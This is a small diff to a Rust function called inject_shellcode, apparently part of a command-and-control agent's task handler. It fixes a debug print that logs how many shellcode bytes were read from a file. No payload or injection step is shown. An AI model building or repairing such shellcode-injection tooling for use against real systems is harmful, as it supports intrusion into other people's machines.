@@ -80,7 +80,7 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
                 Ok(bytes) => {
                     shellcode_bytes = bytes;
                     found_file = true;
-                    eprintln!("DEBUG: Successfully read {} bytes from file", bytes.len());
+                    eprintln!("DEBUG: Successfully read {} bytes from file", shellcode_bytes.len());
                     break;
                 }
                 Err(e) => {
